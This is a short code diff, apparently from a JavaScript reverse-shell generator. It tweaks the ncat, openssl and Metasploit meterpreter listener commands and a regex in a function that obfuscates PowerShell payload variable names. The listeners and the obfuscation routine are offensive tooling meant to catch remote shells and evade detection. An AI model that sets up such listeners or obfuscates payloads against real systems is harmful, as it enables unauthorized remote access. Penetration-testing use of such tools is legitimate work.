@@ -16,7 +16,7 @@ const listenerThree = 'sudo ncat -lvnp <port>'; // ncat cleartext tcp
 
 const listenerFour = 'sudo ncat --ssl -lvnp <port>'; // ncat TLS // issues with this so far
 
-const listenerFive = 'sudo openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 30 -nodes; openssl s_server -quiet -key key.pem -cert cert.pem -port <port>' // openssl TLS
+const listenerFive = 'sudo openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 30 -nodes; sudo openssl s_server -quiet -key key.pem -cert cert.pem -port <port>' // openssl TLS
 
 const listenerSix = 'sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 127.0.0.1; set lport <port>; exploit"' // msfconsole (metasploit) TCP // needs testing
 
@@ -120,7 +120,7 @@ function encodePS(rawShellString, listenerShow=true) {
     const minLen = document.getElementById("minLen").value;
     const maxLen = document.getElementById("maxLen").value;
 
-    let matchies = rawShellString.match(/\$(?!null|zero|false|true)[a-z0-9-_]{2,30}/gi);
+    let matchies = rawShellString.match(/\$(?!null|zero|false|true|script|buffer)[a-z0-9-_]{2,30}/gi);
 
     const varsLen = matchies.length;
 
